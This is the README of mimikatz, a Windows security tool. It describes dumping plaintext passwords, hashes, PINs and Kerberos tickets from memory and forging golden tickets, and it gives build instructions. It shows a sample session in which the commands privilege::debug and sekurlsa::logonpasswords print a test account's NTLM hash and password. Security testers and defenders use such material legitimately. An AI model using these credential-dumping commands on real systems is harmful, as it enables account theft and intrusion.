# mimikatz
`mimikatz` is a tool I've made to learn `C` and make somes experiments with Windows security.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory.
It also can perform pass-the-hash, pass-the-ticket or build _Golden tickets_.
```
mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
 
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : Gentil Kiwi
Domain            : vm-w7-ult-x
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * Password : waza1234/
...
```
But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations (in French, _yes_) on http://blog.gentilkiwi.com.

If you don't want to build it, binaries are availables on http://blog.gentilkiwi.com/mimikatz


## Quick usage

### sekurlsa
todo

### kerberos
todo

### crypto
todo


## Build
`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
* for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=40787)
* _for `mimikatz driver` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_

`mimikatz` uses `SVN` for source control, but is now available with `GIT` too!
You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)

### Synchronize!
* `GIT` URL is : `https://github.com/gentilkiwi/mimikatz.git`
* `SVN` URL is : `https://github.com/gentilkiwi/mimikatz/trunk`

### Build the solution
* After opening the solution, `Build` / `Build Solution` (you can change architecture)
* `mimikatz` is now built and ready to be used! (`Win32` / `x64`)

### `ddk2003`
With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)

For this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.

Follow instructions:
* http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
* _http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_
